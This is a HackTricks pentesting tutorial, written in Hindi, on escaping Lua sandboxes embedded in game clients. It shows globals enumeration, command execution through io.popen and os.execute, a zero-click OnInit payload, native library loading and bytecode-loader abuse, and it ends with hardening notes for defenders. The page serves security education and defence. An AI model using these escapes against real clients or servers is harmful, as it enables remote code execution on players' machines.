# Lua sandboxes को बायपास करें (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

यह पृष्ठ उन व्यावहारिक तकनीकों को एकत्रित करता है जो applications में embedded Lua "sandboxes" की सूची बनाने और उनसे बाहर निकलने के लिए उपयोगी होती हैं (विशेषकर game clients, plugins, या in-app scripting engines)। कई engines एक restricted Lua environment एक्सपोज़ करते हैं, लेकिन शक्तिशाली globals को पहुँच में छोड़ देते हैं जो arbitrary command execution या यहाँ तक कि native memory corruption को सक्षम कर सकते हैं जब bytecode loaders एक्सपोज़ होते हैं।

Key ideas:
- VM को एक अज्ञात environment की तरह समझें: _G को enumerate करें और पता लगाएं कि कौन से dangerous primitives पहुँच योग्य हैं।
- जब stdout/print ब्लॉक हों, किसी भी in-VM UI/IPC चैनल को output sink के रूप में दुरुपयोग करके परिणामों का अवलोकन करें।
- यदि io/os एक्सपोज़ हैं, तो अक्सर आपके पास direct command execution होता है (io.popen, os.execute)।
- यदि load/loadstring/loadfile एक्सपोज़ हैं, तो crafted Lua bytecode को execute करने से कुछ versions में memory safety subvert की जा सकती है (≤5.1 verifiers bypassable हैं; 5.2 में verifier हटाया गया था), जिससे advanced exploitation संभव होता है।

## Sandboxed environment को सूचीबद्ध करें

- पहुँच योग्य tables/functions का inventory करने के लिए global environment को dump करें:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- अगर print() उपलब्ध नहीं है, तो in-VM channels का पुन: उपयोग करें। उदाहरण एक MMO housing script VM का है जहाँ chat output केवल sound call के बाद काम करता है; नीचे एक भरोसेमंद output function बनाया गया है:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
अपने लक्ष्य के लिए इस पैटर्न को सामान्य बनाएं: कोई भी textbox, toast, logger, या UI callback जो strings स्वीकार करता है, reconnaissance के लिए stdout के रूप में कार्य कर सकता है।

## Direct command execution यदि io/os एक्सपोज़ हैं

यदि sandbox अभी भी मानक लाइब्रेरीज़ io या os को एक्सपोज़ करता है, तो संभवतः आपके पास तत्काल command execution है:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- निष्पादन client process के अंदर होता है; कई anti-cheat/antidebug लेयर्स जो external debuggers को ब्लॉक करती हैं, वे in-VM process creation को रोक नहीं पाएंगी।
- इसके अलावा जाँचें: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

यदि host application clients को scripts पुश करता है और VM auto-run hooks (e.g., OnInit/OnLoad/OnEnter) एक्सपोज़ करता है, तो जैसे ही script लोड हो, drive-by compromise के लिए अपना payload वहां रखें:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
कोई भी समान callback (OnLoad, OnEnter, आदि) इस तकनीक को सामान्यीकृत कर देता है जब scripts क्लाइंट पर स्वचालित रूप से भेजे और execute किए जाते हैं।

## Recon के दौरान खोजने के लिए Dangerous primitives

_G enumeration के दौरान, खासकर इन पर देखें:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: source या bytecode को execute करता है; untrusted bytecode को लोड करने का समर्थन करता है।
- package, package.loadlib, require: डायनेमिक लाइब्रेरी लोडिंग और मॉड्यूल इंटरफ़ेस।
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load — native code को सीधे call करने के लिए।

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## वैकल्पिक उन्नयन: Lua bytecode loaders का दुरुपयोग

जब load/loadstring/loadfile पहुँच योग्य हों लेकिन io/os प्रतिबंधित हों, तब निर्मित Lua bytecode का निष्पादन memory disclosure और corruption primitives को जन्म दे सकता है। मुख्य तथ्य:
- Lua ≤ 5.1 में एक bytecode verifier शिप किया गया था जिसमें ज्ञात bypasses मौजूद हैं।
- Lua 5.2 ने verifier को पूरी तरह हटा दिया (official stance: applications should just reject precompiled chunks), जिससे attack surface बढ़ता है अगर bytecode loading निषिद्ध नहीं किया गया हो।
- सामान्य रूप से: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), फिर pivot कर arbitrary read/write या native code execution पर।

यह रास्ता engine/संस्करण-विशिष्ट है और RE की आवश्यकता होती है। गहरी जानकारी, exploitation primitives, और गेम्स में उदाहरण gadgetry के लिए references देखें।

## पहचान और हार्डनिंग नोट्स (रक्षकों के लिए)

- Server side: user scripts को reject या rewrite करें; सुरक्षित APIs को allowlist करें; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi को strip या bind-empty करें।
- Client side: Lua को minimal _ENV के साथ चलाएं, bytecode loading को निषिद्ध करें, एक strict bytecode verifier या signature checks पुनः लागू करें, और client process से process creation को ब्लॉक करें।
- Telemetry: gameclient → child process creation पर अलर्ट करें जो script load के तुरंत बाद हो; इसे UI/chat/script events के साथ correlate करें।

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
